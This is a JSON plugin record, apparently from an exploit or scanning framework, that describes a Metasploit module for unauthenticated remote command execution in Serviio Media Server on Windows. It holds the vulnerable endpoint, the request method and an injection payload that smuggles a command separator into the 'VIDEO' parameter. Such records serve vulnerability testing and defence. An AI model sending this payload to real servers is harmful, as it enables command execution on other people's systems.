{
   "msf_module" : "serviio_checkstreamurl_cmd_exec",
   "references" : [
      "http://www.zeroscience.mk/en/vulnerabilities/ZSL-2017-5408.php",
      "https://blogs.securiteam.com/index.php/archives/3094"
   ],
   "name" : "ServiioCheckstreamurlCmdExec",
   "detection" : {},
   "informations" : {
      "REFERENCES" : [
         "http://www.zeroscience.mk/en/vulnerabilities/ZSL-2017-5408.php",
         "https://blogs.securiteam.com/index.php/archives/3094"
      ],
      "TYPE" : "MSF",
      "PLATFORM" : "WINDOWS",
      "MSF_MODULE" : "serviio_checkstreamurl_cmd_exec",
      "TITLE" : "checkStreamUrl",
      "OSVDB" : 41961,
      "name" : "ServiioCheckstreamurlCmdExec",
      "REQUESTS" : {
         "EXPLOIT1" : {
            "HEADERS" : {
               "Content-Type" : "application/json"
            },
            "PAYLOAD" : "{\"name\":\"checkStreamUrl\",\"parameter\":[\"VIDEO\",\"\\\" \\u0026\\u0026\"]}",
            "TEXT" : "Sending Exploit #1 Request : [POST] /rest/action",
            "VALIDATION" : {
               "TCODE" : [
                  "200"
               ]
            },
            "PATH" : "rest/action",
            "METHOD" : "POST"
         }
      },
      "DESCRIPTION" : "\n\n        This module exploits an unauthenticated remote command execution vulnerability\n\n        in the console component of Serviio Media Server versions 1.4 to 1.8 on\n\n        Windows operating systems.\n\n\n\n        The console service (on port 23423 by default) exposes a REST API which\n\n        which does not require authentication.\n\n\n\n        The 'action' API endpoint does not sufficiently sanitize user-supplied data\n\n        in the 'VIDEO' parameter of the 'checkStreamUrl' method. This parameter is\n\n        used in a call to cmd.exe resulting in execution of arbitrary commands.\n\n\n\n        This module has been tested successfully on Serviio Media Server versions\n\n        1.4.0, 1.5.0, 1.6.0 and 1.8.0 on Windows 7.\n\n      "
   },
   "osvdb" : 41961,
   "requests" : {
      "EXPLOIT1" : {
         "HEADERS" : {
            "Content-Type" : "application/json"
         },
         "PAYLOAD" : "{\"name\":\"checkStreamUrl\",\"parameter\":[\"VIDEO\",\"\\\" \\u0026\\u0026\"]}",
         "TEXT" : "Sending Exploit #1 Request : [POST] /rest/action",
         "VALIDATION" : {
            "TCODE" : [
               "200"
            ]
         },
         "PATH" : "rest/action",
         "METHOD" : "POST"
      }
   },
   "description" : "\n\n        This module exploits an unauthenticated remote command execution vulnerability\n\n        in the console component of Serviio Media Server versions 1.4 to 1.8 on\n\n        Windows operating systems.\n\n\n\n        The console service (on port 23423 by default) exposes a REST API which\n\n        which does not require authentication.\n\n\n\n        The 'action' API endpoint does not sufficiently sanitize user-supplied data\n\n        in the 'VIDEO' parameter of the 'checkStreamUrl' method. This parameter is\n\n        used in a call to cmd.exe resulting in execution of arbitrary commands.\n\n\n\n        This module has been tested successfully on Serviio Media Server versions\n\n        1.4.0, 1.5.0, 1.6.0 and 1.8.0 on Windows 7.\n\n      ",
   "plugins_directory" : "/home/evil/GIT/Exploits/../data/plugins/",
   "type" : "MSF",
   "platform" : "WINDOWS",
   "title" : "checkStreamUrl"
}
